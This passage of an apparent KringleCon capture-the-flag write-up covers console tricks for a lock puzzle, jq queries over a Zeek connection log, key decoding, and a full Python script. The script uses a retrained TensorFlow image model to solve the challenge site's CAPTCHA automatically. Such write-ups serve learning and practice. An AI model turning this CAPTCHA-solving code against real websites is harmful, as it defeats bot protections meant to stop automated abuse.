<span class="n">Dragging</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">components</span><span class="w"> </span><span class="n">further</span><span class="w"> </span><span class="n">down</span><span class="w"> </span><span class="n">changed</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">printed</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">console</span><span class="p">:</span>

<span class="n">Well</span><span class="w"> </span><span class="n">done</span><span class="o">!</span><span class="w"> </span><span class="n">Here</span><span class="s1">&#39;s the password:</span>
<span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Tooth</span><span class="w"> </span><span class="n">Fairy</span>
<span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">opened</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">chest</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="mf">6291.088</span><span class="w"> </span><span class="n">seconds</span>
<span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="n">Well</span><span class="w"> </span><span class="n">done</span><span class="o">!</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">takes</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Crack</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Crate</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">under</span><span class="w"> </span><span class="n">three</span><span class="w"> </span><span class="n">minutes</span><span class="err">?</span>
<span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="n">Feel</span><span class="w"> </span><span class="n">free</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">handy</span><span class="w"> </span><span class="n">image</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">share</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">score</span><span class="o">!</span>
</code></pre></div>

<ul>
<li>Doing the combination locks in under 3 minutes I think can be done manually.<ul>
<li>But nice thing to do would be to enter a bunch of commands into the browser console to help with some programmatically. Maybe one can enter javascript to also enter the numbers into the locks??</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code>console.log(document.title)
some are maybe fixed??:
VERONICA
KD29XJ37

However, after doing that as fast as I could manually:

You opened the chest in 150.151 seconds
621c8819-1d6a-4d77-bd41-5214a6beccf5:1 Very impressive!! But can you Crack the Crate in less than five seconds?
621c8819-1d6a-4d77-bd41-5214a6beccf5:1 Feel free to use this handy image to share your score!
</code></pre></div>

<ul>
<li>For that I'm thinking burp suite to automate the browser is needed?</li>
<li>When inside the Sled Shop there was a request to get the IP for the connection with longest duration:</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nv">head</span><span class="w"> </span><span class="nv">conn</span>.<span class="nv">log</span><span class="o">|</span><span class="nv">jq</span><span class="w"> </span><span class="s1">&#39;.[&quot;id.orig_h&quot;],.duration&#39;</span><span class="w"> </span><span class="o">-</span><span class="nv">c</span><span class="w"> </span><span class="s1">&#39;sort_by(.duration)&#39;</span>
<span class="nv">cat</span><span class="w"> </span><span class="nv">conn</span>.<span class="nv">log</span><span class="o">|</span><span class="nv">jq</span><span class="w"> </span><span class="o">-</span><span class="nv">s</span><span class="w"> </span><span class="o">-</span><span class="nv">c</span><span class="w"> </span><span class="s1">&#39;sort_by(.duration)&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">sorted</span>
<span class="nv">cat</span><span class="w"> </span><span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">sorted</span>#...<span class="w"> </span><span class="nv">took</span><span class="w"> </span><span class="nv">forever</span>,<span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nv">just</span><span class="w"> </span><span class="nv">looked</span><span class="w"> </span><span class="nv">at</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">bottom</span>:
<span class="w">                                                                                                                       </span>{<span class="s2">&quot;ts&quot;</span>:<span class="err">&quot;2019-0</span>
<span class="mi">4</span><span class="o">-</span><span class="mi">18</span><span class="nv">T21</span>:<span class="mi">27</span>:<span class="mi">45</span>.<span class="mi">402479</span><span class="nv">Z</span><span class="s2">&quot;,&quot;</span><span class="nv">uid</span><span class="s2">&quot;:&quot;</span><span class="nv">CmYAZn10sInxVD5WWd</span><span class="s2">&quot;,&quot;</span><span class="nv">id</span>.<span class="nv">orig_h</span><span class="s2">&quot;:&quot;</span><span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">52</span>.<span class="mi">132</span><span class="s2">&quot;,&quot;</span><span class="nv">id</span>.<span class="nv">orig_p</span><span class="s2">&quot;:8,&quot;</span><span class="nv">id</span>.<span class="nv">r</span><span class="w">                     </span><span class="nv">esp_h</span><span class="s2">&quot;:&quot;</span><span class="mi">13</span>.<span class="mi">107</span>.<span class="mi">21</span>.<span class="mi">200</span><span class="s2">&quot;,&quot;</span><span class="nv">id</span>.<span class="nv">resp_p</span><span class="s2">&quot;:0,&quot;</span><span class="nv">proto</span><span class="s2">&quot;:&quot;</span><span class="nv">icmp</span><span class="s2">&quot;,&quot;</span><span class="nv">duration</span><span class="s2">&quot;:1019365.337758,&quot;</span><span class="nv">orig_bytes</span><span class="s2">&quot;:3078192                     0,&quot;</span><span class="nv">resp_bytes</span><span class="s2">&quot;:30382240,&quot;</span><span class="nv">conn_state</span><span class="s2">&quot;:&quot;</span><span class="nv">OTH</span><span class="s2">&quot;,&quot;</span><span class="nv">missed_bytes</span><span class="s2">&quot;:0,&quot;</span><span class="nv">orig_pkts</span><span class="s2">&quot;:961935,&quot;</span><span class="nv">orig_ip_bytes</span><span class="s2">&quot;:577                     16100,&quot;</span><span class="nv">resp_pkts</span><span class="s2">&quot;:949445,&quot;</span><span class="nv">resp_ip_bytes</span><span class="err">&quot;:56966700}]   </span>
</code></pre></div>

<p>Finishing each challenge gives some tips to some other challenges. There was a hint to the Sled Route API suggesting to use jq. And there was another that if you beat the Trail Game on Hard there's more hints? Also beating the lock game in under 3 minutes is another hint I think..</p>
<ul>
<li>Next one I managed was the key bitting one to get into the Steam Tunnels! There was a good talk on this topic with a link to <a href="https://github.com/deviantollam/decoding">https://github.com/deviantollam/decoding</a> and then just used that and tried maybe 5 keys before finding the right now. GIMP is not my specialty but the decoders helped a bit. The image of the key was not discoverable until one got into the Sleigh Shop.</li>
</ul>
<h2>Image AI</h2>
<p>And then we get to the CAPTCHA + tensorflow madness! This was real fun, haven't had to do much with tensorflow before. Did not have to read much at all about tensorflow to get this going, could basically just glue together the provided python scripts.</p>
<p>Another very good kringlecon talk on this topic: <a href="https://www.youtube.com/watch?v=jmVPLwjm_zs&amp;feature=youtu.be">https://www.youtube.com/watch?v=jmVPLwjm_zs&amp;feature=youtu.be</a> led to a github repo. Some other code and training images were found as soon as one got far enough into the Steam Tunnels. I managed to after not too much googling get the python script to store the images in teh CAPTEHA in a directory and then run the predict tensorflow python script on the github repo against it. It was however too slow. Fortunately I had access to a machine with lots of cores so moving all the data there and re-running the python got it working for me. 2 oversubscribed cores and 2GB RAM was too little. 80 dedicated single server skylake cores and 356GB RAM completed it much faster. There were messages about tensorflow from pip not having been compiled with all the things enabled. I could I suppose also have tried this with a GPU :) And the PYTHON:</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="c1"># Fridosleigh.com CAPTEHA API - Made by Krampus Hollyfeld</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;TF_CPP_MIN_LOG_LEVEL&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span>
<span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="nn">tf</span>
<span class="n">tf</span><span class="o">.</span><span class="n">logging</span><span class="o">.</span><span class="n">set_verbosity</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">)</span>
<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">queue</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">load_labels</span><span class="p">(</span><span class="n">label_file</span><span class="p">):</span>
    <span class="n">label</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">proto_as_ascii_lines</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">gfile</span><span class="o">.</span><span class="n">GFile</span><span class="p">(</span><span class="n">label_file</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">proto_as_ascii_lines</span><span class="p">:</span>
        <span class="n">label</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">rstrip</span><span class="p">())</span>
    <span class="k">return</span> <span class="n">label</span>

<span class="k">def</span> <span class="nf">predict_image</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">sess</span><span class="p">,</span> <span class="n">graph</span><span class="p">,</span> <span class="n">image_bytes</span><span class="p">,</span> <span class="n">img_full_path</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">input_operation</span><span class="p">,</span> <span class="n">output_operation</span><span class="p">):</span>
    <span class="n">image</span> <span class="o">=</span> <span class="n">read_tensor_from_image_bytes</span><span class="p">(</span><span class="n">image_bytes</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">output_operation</span><span class="o">.</span><span class="n">outputs</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="p">{</span>
        <span class="n">input_operation</span><span class="o">.</span><span class="n">outputs</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="n">image</span>
    <span class="p">})</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">squeeze</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
    <span class="n">prediction</span> <span class="o">=</span> <span class="n">results</span><span class="o">.</span><span class="n">argsort</span><span class="p">()[</span><span class="o">-</span><span class="mi">5</span><span class="p">:][::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">q</span><span class="o">.</span><span class="n">put</span><span class="p">(</span> <span class="p">{</span><span class="s1">&#39;img_full_path&#39;</span><span class="p">:</span><span class="n">img_full_path</span><span class="p">,</span> <span class="s1">&#39;prediction&#39;</span><span class="p">:</span><span class="n">labels</span><span class="p">[</span><span class="n">prediction</span><span class="p">]</span><span class="o">.</span><span class="n">title</span><span class="p">(),</span> <span class="s1">&#39;percent&#39;</span><span class="p">:</span><span class="n">results</span><span class="p">[</span><span class="n">prediction</span><span class="p">]}</span> <span class="p">)</span>

<span class="k">def</span> <span class="nf">load_graph</span><span class="p">(</span><span class="n">model_file</span><span class="p">):</span>
    <span class="n">graph</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">Graph</span><span class="p">()</span>
    <span class="n">graph_def</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">GraphDef</span><span class="p">()</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">model_file</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">graph_def</span><span class="o">.</span><span class="n">ParseFromString</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
    <span class="k">with</span> <span class="n">graph</span><span class="o">.</span><span class="n">as_default</span><span class="p">():</span>
        <span class="n">tf</span><span class="o">.</span><span class="n">import_graph_def</span><span class="p">(</span><span class="n">graph_def</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">graph</span>

<span class="k">def</span> <span class="nf">read_tensor_from_image_bytes</span><span class="p">(</span><span class="n">imagebytes</span><span class="p">,</span> <span class="n">input_height</span><span class="o">=</span><span class="mi">299</span><span class="p">,</span> <span class="n">input_width</span><span class="o">=</span><span class="mi">299</span><span class="p">,</span> <span class="n">input_mean</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">input_std</span><span class="o">=</span><span class="mi">255</span><span class="p">):</span>
    <span class="n">image_reader</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">image</span><span class="o">.</span><span class="n">decode_png</span><span class="p">(</span> <span class="n">imagebytes</span><span class="p">,</span> <span class="n">channels</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;png_reader&quot;</span><span class="p">)</span>
    <span class="n">float_caster</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">cast</span><span class="p">(</span><span class="n">image_reader</span><span class="p">,</span> <span class="n">tf</span><span class="o">.</span><span class="n">float32</span><span class="p">)</span>
    <span class="n">dims_expander</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">expand_dims</span><span class="p">(</span><span class="n">float_caster</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">resized</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">image</span><span class="o">.</span><span class="n">resize_bilinear</span><span class="p">(</span><span class="n">dims_expander</span><span class="p">,</span> <span class="p">[</span><span class="n">input_height</span><span class="p">,</span> <span class="n">input_width</span><span class="p">])</span>
    <span class="n">normalized</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">divide</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">subtract</span><span class="p">(</span><span class="n">resized</span><span class="p">,</span> <span class="p">[</span><span class="n">input_mean</span><span class="p">]),</span> <span class="p">[</span><span class="n">input_std</span><span class="p">])</span>
    <span class="n">sess</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">compat</span><span class="o">.</span><span class="n">v1</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">normalized</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="c1"># above is from predict_images_using_trained_model.py because python and import meh</span>

<span class="c1">###########</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">yourREALemailAddress</span> <span class="o">=</span> <span class="s2">&quot;MYREALEmAEL@example.org&quot;</span>

    <span class="c1"># Creating a session to handle cookies</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://fridosleigh.com/&quot;</span>

    <span class="n">json_resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{}</span><span class="s2">api/capteha/request&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">b64_images</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;images&#39;</span><span class="p">]</span>                    <span class="c1"># A list of dictionaries eaching containing the keys &#39;base64&#39; and &#39;uuid&#39;</span>
    <span class="n">challenge_image_type</span> <span class="o">=</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;select_type&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>     <span class="c1"># The Image types the CAPTEHA Challenge is looking for.</span>
    <span class="n">challenge_image_types</span> <span class="o">=</span> <span class="p">[</span><span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="n">challenge_image_type</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; and &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span> <span class="c1"># cleaning and formatting</span>

    <span class="c1">#print(b64_images)</span>
    <span class="c1"># 0 wipe unknown_images dir</span>
    <span class="c1"># why wipe it tho?</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="s1">&#39;unknown_images&#39;</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s1">&#39;unknown_images&#39;</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s1">&#39;unknown_images&#39;</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="kc">True</span>
    <span class="c1"># 1 write b64 to unknown_images dir</span>

    <span class="n">imgcnt</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">b64_images</span><span class="p">:</span>
        <span class="n">imgcnt</span> <span class="o">=</span> <span class="n">imgcnt</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="n">content</span> <span class="o">=</span> <span class="n">image</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">]</span>
        <span class="n">uuid</span> <span class="o">=</span> <span class="n">image</span><span class="p">[</span><span class="s1">&#39;uuid&#39;</span><span class="p">]</span>

        <span class="k">try</span><span class="p">:</span>
           <span class="n">content</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
           <span class="n">filename</span> <span class="o">=</span> <span class="s2">&quot;unknown_images/</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">uuid</span>
           <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s2">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
                <span class="c1">#f.write(content.decode(&quot;utf-8&quot;))</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
           <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
    <span class="c1">#    if imgcnt &gt; 10:</span>
     <span class="c1">#       break</span>
    <span class="c1"># 2 run the predict against it</span>
    <span class="c1">#  python3 predict_images_using_trained_model.py would have been fun instead we copy pasta</span>
    <span class="c1"># https://github.com/chrisjd20/img_rec_tf_ml_demo/blob/master/retrain.py talks about mobilenet and speed optimizations..</span>

    <span class="c1"># Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory</span>
    <span class="n">graph</span> <span class="o">=</span> <span class="n">load_graph</span><span class="p">(</span><span class="s1">&#39;/tmp/retrain_tmp/output_graph.pb&#39;</span><span class="p">)</span>
    <span class="n">labels</span> <span class="o">=</span> <span class="n">load_labels</span><span class="p">(</span><span class="s2">&quot;/tmp/retrain_tmp/output_labels.txt&quot;</span><span class="p">)</span>

    <span class="c1"># Load up our session</span>
    <span class="n">input_operation</span> <span class="o">=</span> <span class="n">graph</span><span class="o">.</span><span class="n">get_operation_by_name</span><span class="p">(</span><span class="s2">&quot;import/Placeholder&quot;</span><span class="p">)</span>
    <span class="n">output_operation</span> <span class="o">=</span> <span class="n">graph</span><span class="o">.</span><span class="n">get_operation_by_name</span><span class="p">(</span><span class="s2">&quot;import/final_result&quot;</span><span class="p">)</span>
    <span class="n">sess</span> <span class="o">=</span> <span class="n">tf</span><span class="o">.</span><span class="n">compat</span><span class="o">.</span><span class="n">v1</span><span class="o">.</span><span class="n">Session</span><span class="p">(</span><span class="n">graph</span><span class="o">=</span><span class="n">graph</span><span class="p">)</span>

    <span class="c1"># Can use queues and threading to spead up the processing</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
    <span class="n">unknown_images_dir</span> <span class="o">=</span> <span class="s1">&#39;unknown_images&#39;</span>
    <span class="n">unknown_images</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">unknown_images_dir</span><span class="p">)</span>

    <span class="c1">#Going to interate over each of our images.</span>
    <span class="k">for</span> <span class="n">image</span> <span class="ow">in</span> <span class="n">unknown_images</span><span class="p">:</span>
        <span class="n">img_full_path</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">/</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">unknown_images_dir</span><span class="p">,</span> <span class="n">image</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Processing Image </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">img_full_path</span><span class="p">))</span>
        <span class="c1"># We don&#39;t want to process too many images at once. 10 threads max</span>
        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">enumerate</span><span class="p">())</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">:</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.0001</span><span class="p">)</span>

        <span class="c1">#predict_image function is expecting png image bytes so we read image as &#39;rb&#39; to get a bytes object</span>
        <span class="n">image_bytes</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">img_full_path</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">predict_image</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">sess</span><span class="p">,</span> <span class="n">graph</span><span class="p">,</span> <span class="n">image_bytes</span><span class="p">,</span> <span class="n">img_full_path</span><span class="p">,</span> <span class="n">labels</span><span class="p">,</span> <span class="n">input_operation</span><span class="p">,</span> <span class="n">output_operation</span><span class="p">))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Waiting For Threads to Finish...&#39;</span><span class="p">)</span>
    <span class="k">while</span> <span class="n">q</span><span class="o">.</span><span class="n">qsize</span><span class="p">()</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">unknown_images</span><span class="p">):</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.001</span><span class="p">)</span>

    <span class="c1">#getting a list of all threads returned results</span>
    <span class="n">prediction_results</span> <span class="o">=</span> <span class="p">[</span><span class="n">q</span><span class="o">.</span><span class="n">get</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">q</span><span class="o">.</span><span class="n">qsize</span><span class="p">())]</span>

    <span class="c1">#do something with our results... Like print them to the screen.</span>

    <span class="c1"># 3 get a list of the uuids for each type</span>
    <span class="n">good_images</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">prediction</span> <span class="ow">in</span> <span class="n">prediction_results</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;TensorFlow Predicted </span><span class="si">{img_full_path}</span><span class="s1"> is a </span><span class="si">{prediction}</span><span class="s1"> with </span><span class="si">{percent:.2%}</span><span class="s1"> Accuracy&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="n">prediction</span><span class="p">))</span>        <span class="k">if</span> <span class="n">prediction</span><span class="p">[</span><span class="s1">&#39;prediction&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="n">challenge_image_types</span><span class="p">:</span>
            <span class="n">good_images</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">prediction</span><span class="p">[</span><span class="s1">&#39;img_full_path&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
    <span class="c1"># TensorFlow Predicted unknown_images/dc646068-e584-11e9-97c1-309c23aaf0ac is a Santa Hats with 99.86% Accuracy</span>

    <span class="c1"># 4 make a new b64_images csv list with the uuids</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">challenge_image_types</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">good_images</span><span class="p">)</span>
    <span class="n">good_images_csv</span> <span class="o">=</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">good_images</span><span class="p">)</span>

<span class="w">    </span><span class="sd">&#39;&#39;&#39;</span>
<span class="sd">    MISSING IMAGE PROCESSING AND ML IMAGE PREDICTION CODE GOES HERE</span>
<span class="sd">    &#39;&#39;&#39;</span>

    <span class="c1"># This should be JUST a csv list image uuids ML predicted to match the challenge_image_type .</span>
    <span class="c1">#final_answer = &#39;,&#39;.join( [ img[&#39;uuid&#39;] for img in b64_images ] )</span>
    <span class="n">final_answer</span> <span class="o">=</span> <span class="n">good_images_csv</span>

    <span class="n">json_resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{}</span><span class="s2">api/capteha/submit&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;answer&#39;</span><span class="p">:</span><span class="n">final_answer</span><span class="p">})</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">]:</span>
        <span class="c1"># If it fails just run again. ML might get one wrong occasionally</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;FAILED MACHINE LEARNING GUESS&#39;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;--------------------</span><span class="se">\n</span><span class="s1">Our ML Guess:</span><span class="se">\n</span><span class="s1">--------------------</span><span class="se">\n</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">final_answer</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;--------------------</span><span class="se">\n</span><span class="s1">Server Response:</span><span class="se">\n</span><span class="s1">--------------------</span><span class="se">\n</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">json_resp</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;CAPTEHA Solved!&#39;</span><span class="p">)</span>
